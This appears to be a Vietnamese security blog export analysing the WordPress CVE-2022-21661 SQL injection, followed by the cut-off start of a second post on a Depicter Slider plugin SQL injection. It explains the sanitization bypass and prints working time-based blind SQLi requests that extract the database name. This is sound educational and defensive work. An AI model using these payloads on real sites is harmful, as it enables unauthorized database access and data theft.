array_unique( (array) $query[\u0026#39;terms\u0026#39;] ); } else { $query[\u0026#39;terms\u0026#39;] = wp_parse_id_list( $query[\u0026#39;terms\u0026#39;] ); } B·ªï sung ƒëi·ªÅu ki·ªán d·ª±a v√†o $query['field']: N·∫øu l√† slug ho·∫∑c name =\u0026gt; gi·ªØ nguy√™n c√°ch x·ª≠ l√Ω c≈©. N·∫øu l√† ID =\u0026gt; d√πng wp_parse_id_list() ƒë·ªÉ √©p ki·ªÉu d·ªØ li·ªáu th√†nh m·∫£ng s·ªë nguy√™n an to√†n. Ta bi·∫øt ƒë√¢y l√† b∆∞·ªõc √©p ki·ªÉu d·ªØ li·ªáu th√†nh m·∫£ng s·ªë nguy√™n b·ªüi v√¨ trong tax_query1, tham s·ªë field ch·ªâ nh·∫≠n 4 gi√° tr·ªã: slug, name, term_taxonomy_id v√† term_id. Trong ƒë√≥, hai tr∆∞·ªùng term_taxonomy_id v√† term_id thu·ªôc b·∫£ng wp_term_taxonomy v√† ƒë·ªÅu c√≥ ki·ªÉu d·ªØ li·ªáu BIGINT UNSIGNED. {: .prompt-tip }\nmysql\u0026gt; DESC wp_term_taxonomy; +------------------+-----------------+------+-----+---------+----------------+ | Field | Type | Null | Key | Default | Extra | +------------------+-----------------+------+-----+---------+----------------+ | term_taxonomy_id | bigint unsigned | NO | PRI | NULL | auto_increment | | term_id | bigint unsigned | NO | MUL | 0 | | | taxonomy | varchar(32) | NO | MUL | | | | description | longtext | NO | | NULL | | | parent | bigint unsigned | NO | | 0 | | | count | bigint | NO | | 0 | | +------------------+-----------------+------+-----+---------+----------------+ 6 rows in set (0.01 sec) How it work? V·ªã tr√≠ l·ªó h·ªïng n·∫±m trong h√†m clean_query c·ªßa class WP_Tax_Query thu·ªôc file src/wp-includes/class-wp-tax-query.php\nprivate function clean_query( \u0026amp;$query ) { if ( empty( $query[\u0026#39;taxonomy\u0026#39;] ) ) { if ( \u0026#39;term_taxonomy_id\u0026#39; !== $query[\u0026#39;field\u0026#39;] ) { $query = new WP_Error( \u0026#39;invalid_taxonomy\u0026#39;, __( \u0026#39;Invalid taxonomy.\u0026#39; ) ); return; } // So long as there are shared terms, \u0026#39;include_children\u0026#39; requires that a taxonomy is set. $query[\u0026#39;include_children\u0026#39;] = false; } elseif ( ! taxonomy_exists( $query[\u0026#39;taxonomy\u0026#39;] ) ) { $query = new WP_Error( \u0026#39;invalid_taxonomy\u0026#39;, __( \u0026#39;Invalid taxonomy.\u0026#39; ) ); return; } $query[\u0026#39;terms\u0026#39;] = array_unique( (array) $query[\u0026#39;terms\u0026#39;] ); // \u0026lt;== Vulnerability location if ( is_taxonomy_hierarchical( $query[\u0026#39;taxonomy\u0026#39;] ) \u0026amp;\u0026amp; $query[\u0026#39;include_children\u0026#39;] ) { $this-\u0026gt;transform_query( $query, \u0026#39;term_id\u0026#39; ); if ( is_wp_error( $query ) ) { return; } $children = array(); foreach ( $query[\u0026#39;terms\u0026#39;] as $term ) { $children = array_merge( $children, get_term_children( $term, $query[\u0026#39;taxonomy\u0026#39;] ) ); $children[] = $term; } $query[\u0026#39;terms\u0026#39;] = $children; } $this-\u0026gt;transform_query( $query, \u0026#39;term_taxonomy_id\u0026#39; ); } {: file=\u0026ldquo;src/wp-includes/class-wp-tax-query.php v5.8.2\u0026rdquo; }\nTrong h√†m clean_query, tham s·ªë $query ƒë∆∞·ª£c truy·ªÅn theo tham chi·∫øu (c√≥ d·∫•u \u0026amp;). Do ƒë√≥, m·ªçi thay ƒë·ªïi tr√™n bi·∫øn $query b√™n trong h√†m s·∫Ω t√°c ƒë·ªông tr·ª±c ti·∫øp ƒë·∫øn bi·∫øn $query g·ªëc ƒë∆∞·ª£c truy·ªÅn v√†o t·ª´ b√™n ngo√†i.\nPayload ƒë∆∞·ª£c truy·ªÅn v√†o th√¥ng qua $query['terms']. Trong h√†m clean_query, gi√° tr·ªã n√†y s·∫Ω ƒë∆∞·ª£c x·ª≠ l√Ω v√† l√†m s·∫°ch.\nüëâ V√¨ v·∫≠y, ƒë·ªÉ khai th√°c th√†nh c√¥ng, payload trong $query['terms'] c·∫ßn v∆∞·ª£t qua to√†n b·ªô c∆° ch·∫ø ki·ªÉm tra v√† l·ªçc c·ªßa clean_query tr∆∞·ªõc khi ƒë·∫øn b∆∞·ªõc th·ª±c thi SQL.\nDebugging Do logic c·ªßa WordPress Core kh√° ph·ª©c t·∫°p, ta c·∫ßn s·ª≠ d·ª•ng debugger ƒë·ªÉ ph√¢n t√≠ch. ƒê·∫∑t breakpoint t·∫°i ƒë·∫ßu h√†m clean_query, sau ƒë√≥ nh·∫•n F5 ƒë·ªÉ b·∫Øt ƒë·∫ßu debug.\nKhi truy c·∫≠p http://localhost/\u0026lt;page-title\u0026gt;, debugger s·∫Ω d·ª´ng t·∫°i h√†m clean_query.\nL·∫ßn ƒë·∫ßu, WordPress th·ª±c hi·ªán query v·ªõi taxonomy = wp_theme (kh√¥ng ph·∫£i gi√° tr·ªã ta truy·ªÅn v√†o). Nh·∫•n F5 th√™m m·ªôt l·∫ßn ƒë·ªÉ b·ªè qua, debugger s·∫Ω ƒë·∫øn query c√≥ taxonomy kh·ªõp v·ªõi gi√° tr·ªã ta truy·ªÅn v√†o.\nV√¨ $query['taxonomy'] t·ªìn t·∫°i n√™n truy v·∫•n v∆∞·ª£t qua c√°c nh√°nh if/elseif ban ƒë·∫ßu trong clean_query. Ti·∫øp t·ª•c debug, ƒëi·ªÅu ki·ªán k·∫ø ti·∫øp ƒë∆∞·ª£c th·ªèa m√£n =\u0026gt; ta nh·∫£y v√†o h√†m transform_query v·ªõi tham s·ªë:\n$query (tham chi·∫øu t·ªõi query hi·ªán t·∫°i) $resulting_field = 'term_id' (gi√° tr·ªã fix c·ª©ng) Nh·∫•n F11 ƒë·ªÉ step into v√†o transform_query.\npublic function transform_query( \u0026amp;$query, $resulting_field ) { // other logic if ( $query[\u0026#39;field\u0026#39;] == $resulting_field ) { return; } // Empty \u0026#39;terms\u0026#39; always results in a null transformation. // other logic $args = array( \u0026#39;get\u0026#39; =\u0026gt; \u0026#39;all\u0026#39;, \u0026#39;number\u0026#39; =\u0026gt; 0, \u0026#39;taxonomy\u0026#39; =\u0026gt; $query[\u0026#39;taxonomy\u0026#39;], \u0026#39;update_term_meta_cache\u0026#39; =\u0026gt; false, \u0026#39;orderby\u0026#39; =\u0026gt; \u0026#39;none\u0026#39;, ); // Term query parameter name depends on the \u0026#39;field\u0026#39; being searched on. switch ( $query[\u0026#39;field\u0026#39;] ) { case \u0026#39;slug\u0026#39;: break; // other logic default: $args[\u0026#39;include\u0026#39;] = wp_parse_id_list( $terms ); break; } $term_query = new WP_Term_Query(); $term_list = $term_query-\u0026gt;query( $args ); if ( is_wp_error( $term_list ) ) { $query = $term_list; return; } // other logic $query[\u0026#39;terms\u0026#39;] = wp_list_pluck( $term_list, $resulting_field ); $query[\u0026#39;field\u0026#39;] = $resulting_field; } {: file=\u0026ldquo;src/wp-includes/class-wp-tax-query.php v5.8.2\u0026rdquo; }\nT·∫°i ƒë√¢y, $query['terms'] b·ªã ghi ƒë√® b·ªüi k·∫øt qu·∫£ c·ªßa wp_list_pluck.\nüëâ Mu·ªën gi·ªØ nguy√™n payload trong $query['terms'], ta ph·∫£i tr√°nh ƒë·ªÉ n√≥ b·ªã g√°n l·∫°i. C√≥ 2 c√°ch:\nPh√¢n t√≠ch wp_list_pluck ƒë·ªÉ xem c√≥ l·ªó h·ªïng bypass. K·∫øt th√∫c s·ªõm transform_query b·∫±ng c√°ch l·ª£i d·ª•ng ƒëi·ªÅu ki·ªán (focus): if ( $query[\u0026#39;field\u0026#39;] == $resulting_field ) { return; } Trong h√†m clean_query, ·ªû l·∫ßn g·ªçi transform_query ƒë·∫ßu ti√™n, $resulting_field = 'term_id' (kh√°c v·ªõi gi√° tr·ªã ta truy·ªÅn v√†o l√† 'term_taxonomy_id')\nTuy nhi√™n, ·ªü cu·ªëi clean_query, transform_query ƒë∆∞·ª£c g·ªçi l·∫°i v·ªõi:\n$this-\u0026gt;transform_query( $query, \u0026#39;term_taxonomy_id\u0026#39; ); L√∫c n√†y, $resulting_field tr√πng kh·ªõp v·ªõi $query['field'] m√† ta truy·ªÅn v√†o ('term_taxonomy_id'), n√™n h√†m s·∫Ω return s·ªõm, kh√¥ng ghi ƒë√® $query['terms'].\nüëâ Ch·ªâ c·∫ßn b·ªè qua ƒëi·ªÅu ki·ªán if th·ª© 2 trong clean_query, th√¨ ƒë·∫øn cu·ªëi h√†m, transform_query() s·∫Ω return s·ªõm khi $resulting_field == $query['field']. Khi ƒë√≥, payload trong $query['terms'] v·∫´n nguy√™n v·∫πn, kh√¥ng b·ªã thay ƒë·ªïi.\nTa ch·ªâ c·∫ßn th√™m $query['include_children'] v·ªõi gi√° tr·ªã false th√¨ ƒëi·ªÅu ki·ªán if s·∫Ω kh√¥ng x·∫£y ra.\n$args = [ \u0026#39;post_type\u0026#39; =\u0026gt; \u0026#39;post\u0026#39;, \u0026#39;tax_query\u0026#39; =\u0026gt; [ [ \u0026#39;taxonomy\u0026#39; =\u0026gt; \u0026#39;category\u0026#39;, \u0026#39;field\u0026#39; =\u0026gt; \u0026#39;term_taxonomy_id\u0026#39;, \u0026#39;terms\u0026#39; =\u0026gt; [\u0026#39;payload\u0026#39;], \u0026#39;operator\u0026#39; =\u0026gt; \u0026#39;IN\u0026#39;, \u0026#39;include_children\u0026#39; =\u0026gt; false ], ], ]; Thay ƒë·ªïi $args trong plugin c·ªßa ta, t·∫Øt debugger sau ƒë√≥ truy c·∫≠p v√†o http://localhost/\u0026lt;page-title\u0026gt;, quan s√°t c√¢u query th·ª±c s·ª± nguy√™n v·∫πn.\nüëâ Th√†nh c√¥ng ki·ªÉm so√°t payload.\nFlow ƒê·ªÉ hi·ªÉu r√µ ƒë∆∞·ª£c lu·ªìng g·ªçi h√†m, ta c·∫ßn ph√¢n t√≠ch callstack c·ªßa debugger.\nƒê·∫ßu ti√™n, ƒë·ªëi t∆∞·ª£ng WP_Query ƒë∆∞·ª£c t·∫°o v·ªõi ƒë·ªëi s·ªë $args ch·ª©a terms do ta ki·ªÉm so√°t\n__construct c·ªßa WP_Query ƒë∆∞·ª£c g·ªçi sau ƒë√≥ g·ªçi ƒë·∫øn h√†m query\nquery th·ª±c hi·ªán parse args v·ªõi ƒë·ªëi s·ªë $query sau ƒë√≥ g·ªçi h√†m get_posts\nget_posts ki·ªÉm tra c√¢u ƒëi·ªÅu ki·ªán v√† g·ªçi get_sql l√†m gi√° tr·ªã tr·∫£ v·ªÅ cho $clauses n·∫øu ƒëi·ªÅu ki·ªán ƒë√∫ng. Quan s√°t Variable \u0026gt; Local \u0026gt; $this(WP_Query) \u0026gt; is_singular b√™n debugger tab, is_singular c√≥ gi√° tr·ªã false n√™n c√¢u ƒëi·ªÅu ki·ªán ƒë√∫ng, get_sql ƒë∆∞·ª£c g·ªçi.\nget_sql tr·∫£ v·ªÅ gi√° tr·ªã c·ªßa get_sql_clauses\nget_sql_clauses g·ªçi ƒë·∫øn get_sql_for_query v·ªõi ƒë·ªëi s·ªë l√† tham chi·∫øu ƒë·∫øn $queries\nget_sql_for_query duy·ªát qua m·∫£ng $query ki·ªÉm tra c√°c $key, n·∫øu $key kh√¥ng ph·∫£i relation th√¨ ki·ªÉm tra ƒëi·ªÅu ki·ªán is_first_order_clause c·ªßa $claude\nN·∫øu $clause c√≥ 1 trong c√°c key sau:\n$keys = [\u0026#39;terms\u0026#39;, \u0026#39;taxonomy\u0026#39;, \u0026#39;include_children\u0026#39;, \u0026#39;field\u0026#39;, \u0026#39;operator\u0026#39;] Th√¨ get_sql_for_clause s·∫Ω ƒë∆∞·ª£c g·ªçi v·ªõi ƒë·ªëi s·ªë $clause v√† $query\nget_sql_for_clause g·ªçi ƒë·∫øn clean_query ƒë·ªÉ l√†m s·∫°ch $clause, nh∆∞ng ta ƒë√£ bypass =\u0026gt; terms trong $clause kh√¥ng thay ƒë·ªïi.\n$where ƒë∆∞·ª£c g√°n gi√° tr·ªã ch·ª©a payload terms do ta ki·ªÉm so√°t, v√† ƒë∆∞·ª£c g√°n v√†o $sql tr·∫£ v·ªÅ.\n$sql['where'] ƒë∆∞·ª£c g√°n l·∫°i gi√° tr·ªã tr∆∞·ªõc khi tr·∫£ v·ªÅ.\nget_sql_for_query nh·∫≠n $sql tr·∫£ v·ªÅ t·ª´ get_sql_for_clause, th√™m () v√†o $sql['where'] v√† tr·∫£ v·ªÅ cho get_sql_clauses\nget_sql_clauses th√™m AND v√†o $sql['where'] v√† tr·∫£ v·ªÅ cho get_sql.\nget_sql tr·∫£ v·ªÅ gi√° tr·ªã l·∫•y t·ª´ get_sql_clauses\nget_posts l·∫•y gi√° tr·ªã tr·∫£ v·ªÅ t·ª´ get_sql g√°n cho $clauses\n$where ƒë∆∞·ª£c concat v·ªõi gi√° tr·ªã $clauses['where']\nüëâ get_posts l√† h√†m ch√≠nh th·ª±c thi SQL query b·∫±ng $wpdb ƒë·ªÉ bi·∫øt c√¢u query ƒë∆∞·ª£c th·ª±c thi ·ªü ƒë√¢u, ta ƒë·∫∑t breakpoint t·∫°i n∆°i c√≥ $wpdb trong get_posts, quan s√°t $wpdb \u0026gt; last_query (ch·ª©a c√¢u l·ªánh th·ª±c thi g·∫ßn nh·∫•t) v√† li√™n t·ª•c F10 ƒë·ªÉ debugger ch·∫°y ƒë·∫øn n∆°i th·ª±c thi query.\nL·ªói \u0026quot;Unknown column 'payload' in 'where clause'\u0026quot; xu·∫•t hi·ªán t·∫°i tab debugger ch·ª©a n·ªôi dung c·ªßa payload\nüëâ $where ch·ª©a payload ƒë∆∞·ª£c th√™m v√†o $this-\u0026gt;request t·∫°i d√≤ng 3012 v√† th·ª±c thi t·∫°i d√≤ng 3026 b·∫±ng $wpdb-\u0026gt;get_col()\nChart\nExploit Ta t√πy ch·ªânh gi√° tr·ªã c·ªßa terms ƒë·ªÉ m√¥ ph·ªèng tr∆∞·ªùng h·ª£p terms truy·ªÅn v√†o c√≥ th·ªÉ ki·ªÉm so√°t b·ªüi attacker\n\u0026#39;terms\u0026#39; =\u0026gt; [$_GET[\u0026#39;terms\u0026#39;]], Detect SQLi Thay gi√° tr·ªã c·ªßa terms b·∫±ng payload SQLi v√† g·ª≠i request qua Burp Suite:\nGET /demo/?terms=1)+AND+(SELECT+1+FROM+(SELECT+SLEEP(5))a)+%23+ HTTP/1.1 C·∫•u query th·ª±c s·ª±:\nSELECT SQL_CALC_FOUND_ROWS wp_posts.ID FROM wp_posts LEFT JOIN wp_term_relationships ON (wp_posts.ID = wp_term_relationships.object_id) WHERE 1=1 AND ( wp_term_relationships.term_taxonomy_id IN (1) AND (SELECT 1 FROM (SELECT SLEEP(5))a) # ) ) AND wp_posts.post_type = \u0026#39;post\u0026#39; AND (wp_posts.post_status = \u0026#39;publish\u0026#39;) GROUP BY wp_posts.ID ORDER BY wp_posts.post_date DESC LIMIT 0, 10 üëâ D·ª±a tr√™n th·ªùi gian ph·∫£n h·ªìi =\u0026gt; payload ho·∫°t ƒë·ªông.\nGi·∫£i th√≠ch k·ªπ thu·∫≠t (subquery trong m·ªánh ƒë·ªÅ FROM):\nPayload d√πng m·ªôt subquery trong m·ªánh ƒë·ªÅ FROM: FROM (SELECT SLEEP(5)) a. MySQL ph·∫£i th·ª±c thi truy v·∫•n con tr∆∞·ªõc, t·∫°o ra m·ªôt b·∫£ng t·∫°m t·ª´ k·∫øt qu·∫£ c·ªßa subquery, r·ªìi m·ªõi ti·∫øp t·ª•c th·ª±c thi truy v·∫•n ch√≠nh. SELECT SLEEP(5) s·∫Ω l√†m cho truy v·∫•n con ch·∫≠m 5 gi√¢y ‚Äî do ƒë√≥ th·ªùi gian tr·∫£ v·ªÅ c·ªßa c·∫£ truy v·∫•n tƒÉng t∆∞∆°ng ·ª©ng, cho th·∫•y payload ƒë∆∞·ª£c th·ª±c thi. L∆∞u √Ω v·ªÅ cache v√† s·ªë l∆∞·ª£ng h√†ng (rows):\nMySQL c√≥ th·ªÉ t·ªëi ∆∞u/cached m·ªôt s·ªë k·∫øt qu·∫£ con; trong tr∆∞·ªùng h·ª£p c·ª• th·ªÉ n√†y SELECT SLEEP(5) ch·ªâ c·∫ßn th·ª±c thi 1 l·∫ßn ƒë·ªÉ t·∫°o b·∫£ng t·∫°m, n√™n th·∫•y ƒë√∫ng m·ªôt l·∫ßn ƒë·ªô tr·ªÖ. N·∫øu ph·∫ßn tr∆∞·ªõc c·ªßa bi·ªÉu th·ª©c AND tr·∫£ v·ªÅ nhi·ªÅu h√†ng v√† payload ƒë∆∞·ª£c l·ªìng theo c√°ch g√¢y l·∫∑p, th·ªùi gian tr·∫£ v·ªÅ c√≥ th·ªÉ tƒÉng theo c·∫•p s·ªë (t·ª©c l√† nh√¢n l√™n theo s·ªë h√†ng), d·∫´n t·ªõi ƒë·ªô tr·ªÖ l·ªõn h∆°n nhi·ªÅu ‚Äî v√¨ truy v·∫•n con c√≥ th·ªÉ b·ªã th·ª±c thi cho m·ªói h√†ng t√πy c√°ch optimizer x·ª≠ l√Ω truy v·∫•n. Get First Letter of Database Name ƒêi·ªÅu ki·ªán ti√™n quy·∫øt ƒë·ªÉ dump ƒë∆∞·ª£c h·∫øt data l√† ph·∫£i dump ƒë∆∞·ª£c 1 k√Ω t·ª± b·∫•t k·ª≥ c·ªßa t√™n database, n·∫øu l·∫•y ƒë∆∞·ª£c th√¨ g·∫ßn nh∆∞ to√†n b·ªô data ƒë·ªÅu dump ƒë∆∞·ª£c.\nThay gi√° tr·ªã c·ªßa terms b·∫±ng payload SQLi v√† g·ª≠i request qua Burp Suite:\nGET /demo/?terms=1)+AND+(SELECT+1+FROM+(SELECT+IF(SUBSTRING(SCHEMA(),1,1)=0x77,SLEEP(5),0))a)+%23+ HTTP/1.1 S·ª≠ d·ª•ng SUBSTRING() ƒë·ªÉ l·∫•y k√Ω t·ª± ƒë·∫ßu ti√™n c·ªßa database name, IF() tr·∫£ v·ªÅ SLEEP(5) n·∫øu k√Ω t·ª± ƒë√≥ l√† 0x77(w)\nüëâ D·ª±a tr√™n th·ªùi gian ph·∫£n h·ªìi =\u0026gt; k√≠ t·ª± ƒë·∫ßu ti√™n ƒë√∫ng l√† w.\nConclusion L·ªó h·ªïng CVE-2022-21661 trong WordPress Core tr∆∞·ªõc phi√™n b·∫£n 5.8.3, quay ng∆∞·ª£c ƒë·∫øn t·∫≠n phi√™n b·∫£n 3.7.37, xu·∫•t ph√°t t·ª´ vi·ªác l√†m s·∫°ch d·ªØ li·ªáu (sanitization) kh√¥ng ƒë√∫ng c√°ch trong WP_Query d·∫´n ƒë·∫øn l·ªó h·ªïng SQL Injection.\nB·∫£n v√° ƒë√£ √©p ki·ªÉu d·ªØ li·ªáu th√†nh m·∫£ng s·ªë nguy√™n an to√†n tr∆∞·ªõc khi ƒë∆∞a v√†o c√¢u query ƒë·ªÉ th·ª±c thi.\nKey takeaways:\nKi·ªÉm so√°t k·ªπ input t·ª´ ng∆∞·ªùi d√πng. Lu√¥n s·ª≠ d·ª•ng $wpdb-\u0026gt;prepare() khi l√†m vi·ªác v·ªõi database trong WordPress ƒë·ªÉ tr√°nh SQL Injection. Th∆∞·ªùng xuy√™n c·∫≠p nh·∫≠t WordPress v√† ki·ªÉm tra b·∫£o m·∫≠t ƒë·ªÉ tr√°nh tr·ªü th√†nh m·ª•c ti√™u t·∫•n c√¥ng. References SQL Injection cheat sheet - PortSwigger\nCVE-2022-21661 Detail Notes V√¨ patch n·∫±m trong file src/wp-includes/class-wp-tax-query.php File n√†y ƒë·ªãnh nghƒ©a class WP_Tax_Query, ch·ªãu tr√°ch nhi·ªám x·ª≠ l√Ω tham s·ªë tax_query trong WP_Query. V√¨ th·∫ø, n·∫øu c√≥ thay ƒë·ªïi trong file n√†y th√¨ g·∫ßn nh∆∞ ch·∫Øc ch·∫Øn n√≥ li√™n quan ƒë·∫øn qu√° tr√¨nh parse/validate c·ªßa tax_query.\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n","permalink":"//localhost:1313/vi/posts/2025-09-15-cve-2022-21661/","summary":"\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eDo vi·ªác l√†m s·∫°ch d·ªØ li·ªáu (\u003cstrong\u003esanitization\u003c/strong\u003e) kh√¥ng ƒë√∫ng c√°ch trong \u003ccode\u003eWP_Query\u003c/code\u003e, c√≥ nh·ªØng tr∆∞·ªùng h·ª£p c√≥ th·ªÉ x·∫£y ra \u003cstrong\u003eSQL Injection\u003c/strong\u003e th√¥ng qua c√°c \u003cstrong\u003eplugin\u003c/strong\u003e ho·∫∑c \u003cstrong\u003etheme\u003c/strong\u003e s·ª≠ d·ª•ng n√≥ theo m·ªôt c√°ch nh·∫•t ƒë·ªãnh. L·ªó h·ªïng n√†y ƒë√£ ƒë∆∞·ª£c v√° trong WordPress phi√™n b·∫£n \u003cstrong\u003e5.8.3\u003c/strong\u003e. C√°c phi√™n b·∫£n c≈© h∆°n b·ªã ·∫£nh h∆∞·ªüng c≈©ng ƒë√£ ƒë∆∞·ª£c s·ª≠a th√¥ng qua b·∫£n ph√°t h√†nh b·∫£o m·∫≠t, quay ng∆∞·ª£c l·∫°i ƒë·∫øn t·∫≠n phi√™n b·∫£n \u003cstrong\u003e3.7.37\u003c/strong\u003e.\u003c/p\u003e","title":"CVE-2022-21661"},{"content":"Introduction L·ªó h·ªïng x·∫£y ra tr√™n plugin Depicter Slider c·ªßa WordPress tr∆∞·ªõc phi√™n b·∫£n 3.6.2. ƒêi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu c·ªßa b·∫°n, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin.\nCVE ID: CVE-2025-2011 Product: WordPress Depicter Slider Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt;= 3.6.1 CVSS severity: High (9.3) Required Privilege: Unauthenticated Requirements Local WordPress and Debugging Depicter Slider: v3.6.1(vul) v√† v3.6.2(fix) diff tool: meld ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th·∫•y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version Analysis Nguy√™n nh√¢n c·ªë l√µi do ·ª©ng d·ª•ng ch√®n tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ GET request v√†o SQL query m√† kh√¥ng c√≥ c∆° ch·∫ø ki·ªÉm so√°t ch·∫∑t ch·∫Ω.\nPatch Diff D√πng diff tool b·∫•t k√¨ ƒë·ªÉ so s√°nh s·ª± kh√°c bi·ªát gi·ªØa b·∫£n l·ªói v√† b·∫£n v√°. C√≥ s·ª± kh√°c bi·ªát r√µ ·ªü file app/src/Controllers/Ajax/LeadsAjaxController.php\nindex, list, export l√† 3 h√†m ƒë√°ng ch√∫ √Ω n·∫±m trong class LeadsAjaxController\npublic function index(RequestInterface $request, $view) { $args = [ \u0026#39;s\u0026#39; =\u0026gt; Sanitize::textfield($request-\u0026gt;query(\u0026#39;s\u0026#39;, \u0026#39;\u0026#39;)), // other logic ]; $response = \\Depicter::lead()-\u0026gt;get($args); $statusCode = isset($response[\u0026#39;errors\u0026#39;]) ? 400 : 200; return \\Depicter::json($response)-\u0026gt;withStatus($statusCode); } {: file=\u0026ldquo;app/src/Controllers/Ajax/LeadsAjaxController.php v3.2\u0026rdquo; }\npublic function list(RequestInterface $request, $view) { $args = [ \u0026#39;s\u0026#39; =\u0026gt; Sanitize::textfield($request-\u0026gt;query(\u0026#39;s\u0026#39;, \u0026#39;\u0026#39;)), // other logic ]; $response = \\Depicter::leadRepository()-\u0026gt;getResults($args); return \\Depicter::json($response); } {: file=\u0026ldquo;app/src/Controllers/Ajax/LeadsAjaxController.php v3.2\u0026rdquo; }\npublic function export(RequestInterface $request, $view) { $args = [ \u0026#39;s\u0026#39; =\u0026gt; Sanitize::textfield($request-\u0026gt;query(\u0026#39;s\u0026#39;, \u0026#39;\u0026#39;)), // other logic ]; $response = \\Depicter::leadRepository()-\u0026gt;getResults($args); // other logic return \\Depicter::json([ \u0026#39;errors\u0026#39; =\u0026gt; [__(\u0026#39;error occurred during the export process\u0026#39;, \u0026#39;depicter\u0026#39;)] ])-\u0026gt;withStatus(400); } {: file=\u0026ldquo;app/src/Controllers/Ajax/LeadsAjaxController.php v3.2\u0026rdquo; }\nC·∫£ 3 h√†m ƒë·ªÅu ƒë∆∞·ª£c v√° b·∫±ng c√°ch s·ª≠ d·ª•ng Sanitize::sql thay cho Sanitize::textfield nh·∫±m ƒë·∫£m b·∫£o param 's' ƒë∆∞·ª£c l√†m s·∫°ch v√† escape ph√π h·ª£p cho ng·ªØ c·∫£nh c√¢u l·ªánh SQL.\nHow it work? ƒê·ªÉ hi·ªÉu r√µ h∆°n ch·ª©c nƒÉng c·ªßa textfield v√† sql ta t√¨m ki·∫øm v·ªõi t·ª´ kh√≥a function textfield, c√≥ l·∫Ω ch√∫ng ƒë∆∞·ª£c ƒë·∫∑t trong c√πng 1 file v√¨ ƒë∆∞·ª£c g·ªçi b·∫±ng c√πng 1 class Sanitize\nN·∫øu b·∫°n ƒë√£ c√†i PHP Intelephense Extension trong vscode, b·∫°n c√≥ th·ªÉ di chuy·ªÉn ƒë·∫øn h√†m c·ª• th·ªÉ b·∫±ng c√°ch Ctrl + Click v√†o h√†m c·∫ßn ƒë·∫øn. {: .prompt-tip }\ntextfield tr·∫£ v·ªÅ d·ªØ li·ªáu ƒë√£ ƒë∆∞·ª£c sanitize b·∫±ng sanitize_text_field, sql c≈©ng l√† h√†m trong c√πng class, tr·∫£ v·ªÅ d·ªØ li·ªáu ƒë√£ ƒë∆∞·ª£c escape SQL\npublic static function sql( $input ) { return esc_sql( $input ); } {: file=\u0026ldquo;vendor/averta/wordpress/src/Utility/Sanitize.php v3.2\u0026rdquo; }\nV√¨ ƒë√¢y l√† l·ªó h·ªïng unauthenticated, vi·ªác c√≥ 3 h√†m nh∆∞ n√†y, ta c·∫ßn x√°c ƒë·ªãnh xem ƒëi·ªÉm g·ªçi ƒë·∫øn ch√∫ng c√≥ c∆° ch·∫ø x√°c th·ª±c hay kh√¥ng. Ch·ªâ sau khi ch·∫Øc ch·∫Øn r·∫±ng h√†m n√†o th·ª±c s·ª± ƒë∆∞·ª£c g·ªçi trong b·ªëi c·∫£nh kh√¥ng y√™u c·∫ßu x√°c th·ª±c, ta m·ªõi ti·∫øp t·ª•c ph√¢n t√≠ch ph·∫ßn logic b√™n trong ƒë·ªÉ ki·ªÉm tra kh·∫£ nƒÉng g√¢y ra SQL Injection gi√∫p gi·ªõi h·∫°n ph·∫°m vi truy v·∫øt.\nƒê·ªÉ x√°c ƒë·ªãnh 3 h√†m tr√™n ƒë∆∞·ª£c g·ªçi ·ªü ƒë√¢u, ta c√≥ th·ªÉ t√¨m ki·∫øm tr·ª±c ti·∫øp theo t√™n h√†m. Tuy nhi√™n, c√°c t·ª´ kh√≥a nh∆∞ index, list, hay export l·∫°i qu√° ph·ªï bi·∫øn n√™n k·∫øt qu·∫£ t√¨m ki·∫øm s·∫Ω r·∫•t nhi·ªÅu v√† kh√≥ l·ªçc. V√¨ v·∫≠y, thay v√¨ t√¨m theo t√™n h√†m, ta t√¨m v·ªõi t·ª´ kh√≥a l√† t√™n class LeadsAjaxController. B·ªüi l·∫Ω khi ƒë∆∞·ª£c s·ª≠ d·ª•ng, c√°c h√†m n√†y ƒë·ªÅu ph·∫£i ƒë∆∞·ª£c g·ªçi th√¥ng qua class, nh·ªù ƒë√≥ ph·∫°m vi k·∫øt qu·∫£ t√¨m ki·∫øm s·∫Ω ƒë∆∞·ª£c thu h·∫πp v√† d·ªÖ d√†ng h∆°n.\nüëâ LeadsAjaxController ƒë∆∞·ª£c s·ª≠ d·ª•ng trong qu√° tr√¨nh ƒëƒÉng k√Ω route Ajax. Khi c√≥ request g·ª≠i t·ªõi endpoint /wp-admin/admin-ajax.php?action=action_here\u0026amp;param1=param1_here\u0026amp;paramN=paramN_here, h·ªá th·ªëng s·∫Ω d·ª±a tr√™n khai b√°o handle('LeadsAjaxController@function') ƒë·ªÉ g·ªçi t·ªõi ph∆∞∆°ng th·ª©c t∆∞∆°ng ·ª©ng trong class LeadsAjaxController\nC·∫£ ba h√†m ta ƒëang focus ƒë·ªÅu ƒë∆∞·ª£c g·ªçi b·∫±ng ph∆∞∆°ng th·ª©c GET, nh∆∞ng export l·∫°i c√≥ middleware x·ª≠ l√Ω csrf-api, n√™n ta b·ªè qua. Ch·ªâ truy v·∫øt index v√† list\nKhi ph√¢n t√≠ch hai h√†m n√†y, ta th·∫•y trong h√†m index, bi·∫øn $response ƒë∆∞·ª£c g√°n gi√° tr·ªã t·ª´ \\Depicter::lead()-\u0026gt;get($args). Tuy nhi√™n, ph∆∞∆°ng th·ª©c get() l·∫°i ti·∫øp t·ª•c g·ªçi ƒë·∫øn \\Depicter::leadRepository()-\u0026gt;getResults($args), t·ª©c l√† c√πng m·ªôt logic m√† h√†m list ƒë√£ g·ªçi tr·ª±c ti·∫øp. Do ƒë√≥, ta ch·ªçn h√†m list l√†m ƒëi·ªÉm truy v·∫øt ch√≠nh.\npublic function list(RequestInterface $request, $view) { $args = [ \u0026#39;s\u0026#39; =\u0026gt; Sanitize::textfield($request-\u0026gt;query(\u0026#39;s\u0026#39;, \u0026#39;\u0026#39;)), \u0026#39;ids\u0026#39; =\u0026gt; 